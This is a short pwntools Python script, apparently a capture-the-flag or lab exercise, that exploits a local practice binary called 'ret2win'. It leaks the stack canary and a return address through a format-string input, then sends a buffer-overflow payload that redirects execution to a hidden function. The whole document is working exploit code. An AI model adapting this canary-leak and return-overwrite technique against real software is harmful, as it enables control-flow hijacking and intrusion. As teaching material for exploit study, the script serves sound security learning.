from pwn import *

context(os="linux", arch="amd64")
# context.terminal = ["terminator", "-e"] # uncomment if you want to use terminator as your terminal

input_to_prog = "%17$p...%19$p"
if args.GDB:
    gs = '''
continue
'''
    # in case GDB is passed we open it in gdb and continue right away
    p = gdb.debug(["./ret2win", input_to_prog], gdbscript=gs)
else:
    p = process(["./ret2win", input_to_prog])

print(p.recvline()) # This will receive one line from the program (the "You Inserted:" line)
addresses = p.recvline()
print(addresses)
addresses = addresses.strip().split(b'...') # receive the line of the leaked addresses
# addresses[0] = canary
# addresses[1] = address in main
canary = int(addresses[0], 16) # convert the bytes to number
ret_addr = int(addresses[1], 16) # convert the bytes to number
# print the canary value and leaked address
print(f"The canary value is: 0x{canary:x}, ret_addr is: 0x{ret_addr:x}")

secret_function_offset = 0xD1
fill_buffer = 72
secret_function_address = ret_addr - secret_function_offset
payload = b"A"*fill_buffer + p64(canary) + b"PADDPADD" + p64(secret_function_address)
p.sendline(payload)
print(p.recv())
p.close()
